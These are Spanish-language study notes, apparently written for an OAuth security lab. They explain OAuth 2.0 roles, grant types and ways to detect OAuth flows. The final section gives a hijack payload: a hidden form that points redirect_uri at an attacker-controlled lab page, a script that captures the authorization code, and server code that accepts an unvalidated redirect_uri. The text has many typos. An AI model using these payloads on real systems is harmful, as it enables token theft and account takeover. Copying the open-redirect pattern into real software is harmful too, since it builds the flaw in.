En aplicaciones modernas, las vulnerabilidades OAuth son serias y fecuentes, hablaremos sobre esta versión y la siguiente la 2.0, y los frameworks

# Objetivos de aprendizaje

- Conceptos esenciales de OAuth 2.0
- Flow
- Identificas dichos servcios
- Explotar técnicas
- Evolución de OAuth 2.1

# Conceptos Clave

Discutiremos los conectpos clave para enteder esta vulnearbilidad, estos conecptos son para entender los frameworks donde eta construido. 

## Recursos de Jefe

El recurso jefe es una persona o un sistema que controla los datos y la autorizacion a la aplicacion y acceso a dicho datos. Este conecpto es fundamentar porque se centra alrededor del consentimiento y el control.

## Cliente

El cliente es la aplicación movil o la aplicacion web. Esto son intermediarios, consultas y recursos dependiendo las acciones que permite el jefe. 

## Autorización de Servidor

La autorización del servidor es responsable de qque ningun token emisor tenga acceso despues de la autentificación del recurso y obtenga previa autorización. La autorización del servidor juega un rol crucial en el proceso de OAuth asegurando que el cliente tiene los permisos solo los usuarios legitimos. 

## Recursos del Servidor

El servidor hostea los recursos y los protegue aceptando y respondiendo las consultas a dichos recuros usando tokens de acceso. El servidor solo autentificay autoriza a clientes que puedan acceder y manipular los recursos.

## Garantia de Autorización

EL cliente usa credenciales para representar la autorización al recurso, y obtiene su token. Los primeros tipos son 

- Autorhization
- Code
- Implicit
- Resource Owener Password CRedentials
- Client Credentials

## Token de Acceso

Una credencial de un cliente acceso a recursos protegidos en nombre del propietario del recurso. Esto limita la vida y un alcance mas limitado. Los tokens de acecso son esenciales para un mantenimiento seguro y protegido en la comunicación del cliente y el recurso del servidor esto se hace en todo.

## Regenerar Token

Una credencial de un cliente obtiene un nuevo acces ode token sin requererir la re-autentificación del propietario de dicho recurso. 

## Redirección URI

La URI es la que autoriza al servidor a redirigir el recurso propietario despues de denegar la autorización. Esto checkea al cliente si el cliente tiene la autorizació0n y si la consulta es correcta.

## Alcance

EL alcance es el mecanismo que limita el acceso de la aplicación a usuarios. Esto permite al cliente especificar el nivel de acceso que va a necesitar y la autorización de lservidor informar al usuario que acceso tiene. 

## Parametro estado

Un parametro opcional mantenido entre el cliente y la autorización del servidor. Esto ayuda a prever ataques CSRF (Cross-site request forgery) asegurando que las respuestas concuerdan con las del cliente. Este parametro es crucial para la seguridad de OAuth

## Final de un Token y Autorización

El final es cuando el cliente intercambia la autorización para el acceso al token.

# Tipos de Concesión OAuth

## Concesión de código de autentificación

Esta es muy común usada en la 2.0 situado en el servidor de la aplicaicón, el cliente redirige al usuario la autorización del servidor, cuando el usuario se autentifica y garantiza la autorización. El servidor autoritativo redirige al usuario al cliente con el código. El cliente cambia la autorización del codigo por un token.

![image](https://github.com/user-attachments/assets/f639f066-a695-4b3e-8c31-beb148e530ec)

## Concesión Ímplicita

La concesión ímplicita es un diseño primario de movil y aplicación web donde los clientes aseguran guardar secretos. Directamente con tokens de acceso al cliente sin requerir código de autorización. Este paso, el cliente redirigue al usuario al servidor de autorización. DEspués se autentifica y lo garantiza, este servidor devuelve un token en un fragmento URL

![image](https://github.com/user-attachments/assets/e200a63c-3d63-426a-844d-4a6ce4e5d293)

## Recurso jefe y credenciales

Garantiza que se usen cuando el cliente de alta fiabilidad necesita un recurso,. El cliente recogue las credencailes del usuario y da acceso por token

![image](https://github.com/user-attachments/assets/fd59fde3-0d76-4d00-9f18-f764adafecea)

## Concesión de cliente

Usado pde servidor a servidor interactua. El cliente usa sus credenciales para autentificarse con la autorixzación de lservidor se obtiene un token de acceso, el cliente con la autorización de lservidor usa sus credenciales y se conecta

![image](https://github.com/user-attachments/assets/e164aa5e-0edc-4c82-a827-7c62b674a297)

# Como funciona OAuth (flujo)

![image](https://github.com/user-attachments/assets/177f2a8f-9cda-42c5-b249-3eceb86e8b0d)

# Identificar Servicios OAuth

## Detectar implementaciones OAuth

Cuando analizamos el trafico de la red durante el proceso de logeo, tenemos que poner atención a la redirecciones  HTTP. Estas implementaciones pueden generar directamente autorizaciones de URLK. SI la URL contiene consultas especificas como 

- response_type
- client_id
- redirect_uri
- scope
- state

```
https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123
```

## Identificar el framework de OAuth

Una vez confirmado que se usa OAuth, es ver el framework o libreria de la alpicacion de empleados. Esto nos dara información y vulnerabilidades psoibles.

- HTTP Headers y respuesta
- Codigo
- Autorizacion y finalizaciones de endpoints
- Mensajes de error

# Explotar OAuth - Robar TOken

## Redirección ROL

el Parametro "redirect_uri" especifica durante el flow direct cuando el servidor autoriza y manda el toquen. 

## Vulnerabilidad

Un inseguro redirect, si el atacante gana el control e un dominio y lista la URI, puede manipular la interceptación de tokens

![image](https://github.com/user-attachments/assets/f0e96fca-86d3-49dc-b5a6-617298d20c8c)

## Preparar Payload

```
 <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
            <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
            <input type="submit" value="Hijack OAuth">
        </form>
```

```
<script>
            // Extract the authorization code from the URL
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            document.getElementById('auth_code').innerText = code;
            console.log("Intercepted Authorization Code:", code);
            // code to save the acquired code in database/file etc
        </script>
```

## Explotar OaUTH

```
def oauth_logincsrf(request):
    app = Application.objects.get(name="ContactApp")
    redirect_uri = request.POST.get("redirect_uri", "http://coffee.thm/csrf/callbackcsrf.php") 
    
    authorization_url = (
        f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
    )
    return redirect(authorization_url)

def oauth_callbackflagcsrf(request):
    code = request.GET.get("code")
    
    if not code:
        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) 

    if code:
        return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400)
```











